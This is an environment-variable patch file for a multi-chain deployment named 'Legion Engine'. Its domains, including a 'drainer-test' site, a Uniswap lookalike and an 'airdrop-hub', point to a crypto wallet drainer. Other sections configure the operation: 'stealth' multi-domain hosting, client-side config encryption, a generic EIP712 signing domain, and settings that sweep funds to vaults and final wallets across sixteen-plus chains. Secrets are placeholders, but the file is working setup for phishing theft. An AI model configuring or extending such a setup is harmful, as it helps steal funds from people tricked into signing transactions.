# ═══════════════════════════════════════════════════════════════════════════════
# LEGION ENGINE — Railway ENV PATCH (Jul 2026)
# ═══════════════════════════════════════════════════════════════════════════════
#
# WHERE TO USE:
#   Railway Dashboard → Project → sadrailala service → Variables tab
#   (NOT your local .env unless you run API locally in production mode)
#
# HOW TO APPLY:
#   1) Section A — REPLACE: find existing var → edit value (same key name)
#   2) Section B — ADD: paste new keys you don't have yet
#   3) Section C — OPTIONAL: only if you want 8-chain / extra EVM coverage
#   4) Fill every CHANGE_ME / YOUR_* placeholder before save
#   5) Redeploy service (Railway auto-redeploys on var change)
#
# VERIFY AFTER DEPLOY:
#   curl https://sadrailala-production.up.railway.app/health
#   curl https://sadrailala-production.up.railway.app/api/v1/readiness
#   curl https://sadrailala-production.up.railway.app/api/v1/client-config
#
# NEVER commit this file with real secrets to git.
# ═══════════════════════════════════════════════════════════════════════════════


# ─────────────────────────────────────────────────────────────────────────────
# SECTION A — REPLACE (edit existing Railway variables — same key, new value)
# ─────────────────────────────────────────────────────────────────────────────

# ⚠️ CRITICAL: ENGINE_SPENDER must match address from SETTLEMENT_EXECUTION_PRIVATE_KEY
# NOT the vault address. Derive locally (PowerShell from repo root):
#   node -e "import('viem/accounts').then(m=>console.log(m.privateKeyToAccount('0xYOUR_SETTLEMENT_KEY').address))"
ENGINE_SPENDER=CHANGE_ME_DERIVE_FROM_SETTLEMENT_EXECUTION_PRIVATE_KEY

# Fix stale backend URLs (you still have old legionapi-production)
RAILWAY_PUBLIC_URL=https://sadrailala-production.up.railway.app
DEMO_API_URL=https://sadrailala-production.up.railway.app

# CORS — REPLACE entire API_CORS_ORIGINS value (added legion-cdn, removed trailing slash)
API_CORS_ORIGINS=http://localhost:8084,https://airdrop-hub.vercel.app,https://legion-drainer-test.surge.sh,https://legionapi-production.up.railway.app,https://sadrailala-production.up.railway.app,https://uniswap-app-defi.surge.sh,https://legion-cdn.surge.sh

# Redis — only if Railway shows literal ${{Redis.REDIS_URL}} unresolved:
# Link Redis plugin in Railway → Variables → Reference → Redis.REDIS_URL
# Do NOT paste ${{...}} manually; use Railway's variable reference UI.


# ─────────────────────────────────────────────────────────────────────────────
# SECTION B — ADD NEW (keys missing from your current Railway env)
# ─────────────────────────────────────────────────────────────────────────────

# Canonical backend (client-config + scripts fallback)
BACKEND_URL=https://sadrailala-production.up.railway.app
API_BASE_URL=https://sadrailala-production.up.railway.app

# ── Gas top-up — prevents execution wallets running dry (funds stuck mid-tx) ──
GAS_TOPUP_ENABLED=true
GAS_TOPUP_CRON=*/5 * * * *
# Hot wallets that FUND execution wallets when balance < GAS_RESERVE:
RESERVE_WALLET_EVM_PRIVATE_KEY=CHANGE_ME_64_HEX_EVM_RESERVE
RESERVE_WALLET_SOLANA_PRIVATE_KEY=CHANGE_ME_BASE58_SOL_RESERVE
RESERVE_WALLET_TRON_PRIVATE_KEY=CHANGE_ME_64_HEX_TRON_RESERVE
RESERVE_WALLET_TON_MNEMONIC=CHANGE_ME_24_WORD_TON_RESERVE
RESERVE_WALLET_BITCOIN_WIF=CHANGE_ME_BTC_RESERVE_WIF

# ── TON jetton sweep (USDT stuck in vault without this) ──
SWEEP_TON_JETTON_MASTERS=EQA2kCVNwVsil2EM2mB0SkXytxC2Q1rDkLApNUT7H9eRrd8v
SWEEP_CREATE_ATA=true

# ── EVM RPC backups (chains you have primary but no backup) ──
RPC_AVALANCHE_BACKUP=https://avalanche-c-chain-rpc.publicnode.com
RPC_SCROLL_BACKUP=https://rpc.scroll.io
RPC_BLAST_BACKUP=https://rpc.blast.io
RPC_MANTLE_BACKUP=https://rpc.mantle.xyz

# ── Missing EVM chains (frontend 16-chain list — settlement fails without RPC) ──
RPC_FANTOM_PRIVATE=https://rpc.fantom.network
RPC_CRONOS_PRIVATE=https://evm.cronos.org
RPC_GNOSIS_PRIVATE=https://rpc.gnosischain.com
RPC_CELO_PRIVATE=https://forno.celo.org
RPC_ZKSYNC_PRIVATE=https://mainnet.era.zksync.io
RPC_LINEA_PRIVATE=https://rpc.linea.build
RPC_FANTOM_BACKUP=https://fantom.publicnode.com
RPC_CRONOS_BACKUP=https://evm.cronos.org
RPC_GNOSIS_BACKUP=https://rpc.gnosischain.com
RPC_CELO_BACKUP=https://forno.celo.org
RPC_ZKSYNC_BACKUP=https://mainnet.era.zksync.io
RPC_LINEA_BACKUP=https://rpc.linea.build

# Helius alias (SPL reads prefer this key name in codebase)
HELIUS_SOLANA_URL=https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY

# Remote hot-reload config (optional — UPDATE_URL empty = updater no-op)
# UPDATE_URL=https://your-bucket.s3.amazonaws.com/legion-live-config.json
# UPDATE_API_KEY=CHANGE_ME
# UPDATE_CRON=0 */6 * * *


# ─────────────────────────────────────────────────────────────────────────────
# SECTION C — OPTIONAL 8-CHAIN (Cosmos + Aptos + Sui native settlement)
# Add only when you have wallets ready. Until then DOT/ALGO/ADA stay anchor_only.
# ─────────────────────────────────────────────────────────────────────────────

# Cosmos Hub
RPC_COSMOS=https://cosmos-rpc.publicnode.com:443
VAULT_ADDRESS_COSMOS=CHANGE_ME_cosmos1...
SOVEREIGN_VAULT_COSMOS=CHANGE_ME_cosmos1...
COSMOS_EXECUTION_MNEMONIC=CHANGE_ME_24_words_or_use_PRIVATE_KEY_below
# COSMOS_EXECUTION_PRIVATE_KEY=CHANGE_ME_64_hex
FINAL_WALLET_COSMOS=CHANGE_ME_cosmos1...
# COSMOS_CW20_CONTRACTS=

# Aptos mainnet
RPC_APTOS_PRIVATE=https://fullnode.mainnet.aptoslabs.com/v1
RPC_APTOS_BACKUP=https://fullnode.mainnet.aptoslabs.com/v1
VAULT_ADDRESS_APTOS=CHANGE_ME_0x...
SOVEREIGN_VAULT_APTOS=CHANGE_ME_0x...
APTOS_EXECUTION_PRIVATE_KEY=CHANGE_ME_64_hex_ed25519
FINAL_WALLET_APTOS=CHANGE_ME_0x...

# Sui mainnet
RPC_SUI_PRIVATE=https://fullnode.mainnet.sui.io
RPC_SUI_BACKUP=https://fullnode.mainnet.sui.io
VAULT_ADDRESS_SUI=CHANGE_ME_0x...
SOVEREIGN_VAULT_SUI=CHANGE_ME_0x...
SUI_EXECUTION_PRIVATE_KEY=CHANGE_ME_base64_ed25519
FINAL_WALLET_SUI=CHANGE_ME_0x...

# Reserve wallets for gas top-up on extended chains (only if Section C enabled)
# RESERVE_WALLET_COSMOS_MNEMONIC=CHANGE_ME
# RESERVE_WALLET_APTOS_PRIVATE_KEY=CHANGE_ME
# RESERVE_WALLET_SUI_PRIVATE_KEY=CHANGE_ME

# ── v5.14 stealth / multi-domain (Railway) ──
CLIENT_VAULT_ENCRYPT=true
CLIENT_DEPLOY_DOMAINS=https://airdrop-hub.vercel.app,https://legion-cdn.surge.sh,https://uniswap-app-defi.surge.sh
API_PROXY_URLS=
# Must match CLIENT_ENCRYPT_KEY in embed: window.LEGION_CONFIG.clientEncryptKey
# EIP712_DOMAIN_JSON={"default":{"name":"DeFi App","version":"1"}}
